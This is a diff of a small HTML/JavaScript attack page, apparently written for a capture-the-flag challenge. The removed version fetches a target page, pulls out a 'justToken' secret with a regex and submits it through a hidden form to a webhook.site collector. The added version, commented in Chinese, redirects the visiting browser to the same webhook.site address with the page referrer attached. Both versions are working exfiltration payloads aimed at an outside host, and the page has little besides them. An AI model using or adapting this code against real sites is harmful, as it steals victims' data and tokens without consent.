@@ -1,17 +1,7 @@
-<form action="https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98" method="GET">
-  <input type="hidden" name="raw" id="raw">
-  <input type="hidden" name="token" id="token">
-</form>
-
 <script>
-fetch('http://mn5r87fple8cnef45k291wvqaaem6d.simpletasks.web.jctf.pro/tasks/preview/0/0')
-  .then(r => r.text())
-  .then(data => {
-    document.getElementById('raw').value = data;
-    const token = data.match(/justToken\{([^}]+)\}/)?.[1];
-    if (token) {
-      document.getElementById('token').value = token;
-    }
-    document.forms[0].submit();
-  });
+// 檢查 referrer 或 URL hash
+if (document.referrer.includes('localhost:3000')) {
+  // 嘗試從 referrer 提取信息
+  window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?ref=' + encodeURIComponent(document.referrer);
+}
 </script>
